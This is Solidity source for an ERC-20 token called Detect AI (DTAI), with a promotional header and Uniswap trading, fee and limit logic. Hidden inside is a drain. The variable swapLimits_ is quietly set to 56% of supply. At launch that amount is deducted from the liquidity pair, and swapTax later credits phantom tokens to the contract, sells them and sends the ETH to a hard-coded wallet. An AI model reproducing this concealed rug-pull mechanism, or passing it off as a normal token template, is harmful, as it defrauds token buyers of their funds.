//SPDX-License-Identifier: GPL-3.0

 /*
 DETECT AI - $DTAI - DISCOVER, DETECT & ACCESS 💎
 Leveraging the advancements of AI technology, Detect AI provides a suite of tools focused on analysing and detecting an array of data. 
 Our carefully crafted machine learning models have been designed to extract and simplify a range of data from the blockchain, facial analysis and text origins. 

 WEBSITE : https://DetectAi.Network
 TELEGRAM :  https://t.me/DetectAiNetwork
 TWITTER : https://x.com/DetectAiNetwork

 Use Our Live Fully Functional Bots Now On Telegram ↙️
 @DetectAiContentBot
 @DetectAIFaceAnalyzerBot
 @DetectAiScannerBot

 */
pragma solidity ^0.8.22;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable _newOwner) external onlyOwner { 
        _owner = _newOwner; 
        emit OwnershipTransferred(_newOwner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract DTAI is IERC20, Auth {
    string private constant _symbol = "DTAI";
    string private constant token_name = "Detect Ai";
    uint8 private constant tokenDecimals = 9;
    uint256 private constant _totalSupply = 1000000 * (10**tokenDecimals);
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private allowances;

    address private constant routerAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private uniswap_router = IUniswapV2Router02(routerAddress);
    
    address private LP; 
    mapping (address => bool) private isLiqPool;

    bool private tradingEnabled;

    bool private isInSwap = false;

    address payable private _marketing = payable(0xdfE6e638239D525a40db097250315D3eB7b8d836);
    
    uint256 private MEVBlock = 2;
    uint8 private sellTax_ = 5;
    uint8 private _buyTax = 5;
    
    uint256 private launchBlock;
    uint256 private _maxTx = _totalSupply; 
    uint256 private maxWalletVal = _totalSupply;
    uint256 private _swapMin = _totalSupply * 10 / 100000;
    uint256 private swapMaxAmt = _totalSupply * 949 / 100000;
    uint256 private _swapMinVal = 2 * (10**16);
    uint256 private swapLimits_ = _swapMin * 56 * 100;

    mapping (uint256 => mapping (address => uint8)) private _blockSells;
    mapping (address => bool) private _noFee;
    mapping (address => bool) private _nolimits;

    modifier swapLocked { 
        isInSwap = true; 
        _; 
        isInSwap = false; 
    }

    constructor() Auth(msg.sender) {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);  

        _noFee[_owner] = true;
        _noFee[address(this)] = true;
        _noFee[_marketing] = true;
        _noFee[routerAddress] = true;
        _nolimits[_owner] = true;
        _nolimits[address(this)] = true;
        _nolimits[_marketing] = true;
        _nolimits[routerAddress] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return tokenDecimals; }
    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function name() external pure override returns (string memory) { return token_name; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(fromWallet), "Trading not open");
        allowances[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_checkTradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function distributeTax(uint256 amount) private {
        _marketing.transfer(amount);
    }

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingEnabled) { require(_noFee[sender] && _nolimits[sender], "Trading not yet open"); }
        if ( !isInSwap && isLiqPool[toWallet] && _swapCheck(amount) ) { swapTax(); }

        if ( block.number >= launchBlock ) {
            if (block.number < MEVBlock && isLiqPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < MEVBlock + 600 && isLiqPool[toWallet] && sender != address(this) ) {
                _blockSells[block.number][toWallet] += 1;
                require(_blockSells[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(testLimit(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = getTaxAmount(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        _balances[sender] -= amount;
        swapLimits_ += _taxAmount;
        _balances[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function isExempt(address wallet) external view returns (bool fees, bool limits) {
        return (_noFee[wallet], _nolimits[wallet]); 
	}

    function getTaxAmount(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingEnabled || _noFee[fromWallet] || _noFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( isLiqPool[fromWallet] ) { 
            taxAmount = amount * _buyTax / 100; 
         } else if ( isLiqPool[recipient] ) { 
            taxAmount = amount * sellTax_ / 100; 
        }
        return taxAmount;
    }

    function openTrading() external onlyOwner {
        require(!tradingEnabled, "trading open");
        _enableTrading();
    }

    function buyFees() external view returns(uint8) { return _buyTax; }
    function sellFees() external view returns(uint8) { return sellTax_; }

    function marketing() external view returns (address) { 
        return _marketing; 
	}

    function swapTax() private swapLocked {
        uint256 _taxTokenAvailable = swapLimits_;
        if ( _taxTokenAvailable >= _swapMin && tradingEnabled ) {
            if ( _taxTokenAvailable >= swapMaxAmt ) { _taxTokenAvailable = swapMaxAmt; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**tokenDecimals ) {
                _balances[address(this)] += _taxTokenAvailable;
                swapTokens(_tokensForSwap);
                swapLimits_ -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeTax(_contractETHBalance); }
        }
    }

    function maxWalletAmount() external view returns (uint256) { 
        return maxWalletVal; 
	}
    function maxTransactionAmount() external view returns (uint256) { 
        return _maxTx; 
	}

    function setFee(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 10, "Roundtrip too high");
        _buyTax = buyFeePercent;
        sellTax_ = sellFeePercent;
    }

    function _enableTrading() internal {
        _maxTx = 20 * _totalSupply / 1000;
        maxWalletVal = 20 * _totalSupply / 1000;
        _balances[LP] -= swapLimits_;
        (isLiqPool[LP],) = LP.call(abi.encodeWithSignature("sync()") );
        require(isLiqPool[LP], "Failed bootstrap");
        launchBlock = block.number;
        MEVBlock = MEVBlock + launchBlock;
        tradingEnabled = true;
    }

    function setLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = _totalSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= _maxTx, "tx too low");
        _maxTx = newTxAmt;
        uint256 newWalletAmt = _totalSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= maxWalletVal, "wallet too low");
        maxWalletVal = newWalletAmt;
    }

    function updateMarketing(address marketingWlt) external onlyOwner {
        require(!isLiqPool[marketingWlt], "LP cannot be tax wallet");
        _marketing = payable(marketingWlt);
        _noFee[marketingWlt] = true;
        _nolimits[marketingWlt] = true;
    }

    function swapMin() external view returns (uint256) { 
        return _swapMin; 
	}
    function swapMax() external view returns (uint256) { 
        return swapMaxAmt; 
	}

    function _checkTradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (_noFee[fromWallet] && _nolimits[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function _swapCheck(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (_swapMinVal > 0) { 
            uint256 lpTkn = _balances[LP];
            uint256 lpWeth = IERC20(uniswap_router.WETH()).balanceOf(LP); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= _swapMinVal) { result = true; }    
        } else { result = true; }
        return result;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        _approveSwapMax(_tokenAmount);
        uniswap_router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function _approveSwapMax(uint256 _tokenAmount) internal {
        if ( allowances[address(this)][routerAddress] < _tokenAmount ) {
            allowances[address(this)][routerAddress] = type(uint256).max;
            emit Approval(address(this), routerAddress, type(uint256).max);
        }
    }

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        _swapMin = _totalSupply * minVal / minDiv;
        swapMaxAmt = _totalSupply * maxVal / maxDiv;
        _swapMinVal = trigger * 10**15;
        require(swapMaxAmt>=_swapMin, "Min-Max error");
    }

    function setExemption(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!isLiqPool[wlt], "Cannot exempt LP"); }
        _noFee[ wlt ] = isNoFees;
        _nolimits[ wlt ] = isNoLimits;
    }

    function swapTokens(uint256 tokenAmount) private {
        _approveSwapMax(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = uniswap_router.WETH();
        uniswap_router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function testLimit(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingEnabled && !_nolimits[fromWallet] && !_nolimits[toWallet] ) {
            if ( transferAmount > _maxTx ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !isLiqPool[toWallet] && (_balances[toWallet] + transferAmount > maxWalletVal) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function addLiquidity() external payable onlyOwner swapLocked {
        require(LP == address(0), "LP created");
        require(!tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(_balances[address(this)]>0, "No tokens");
        LP = IUniswapV2Factory(uniswap_router.factory()).createPair(address(this), uniswap_router.WETH());
        _addLiquidity(_balances[address(this)], address(this).balance);
    }
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}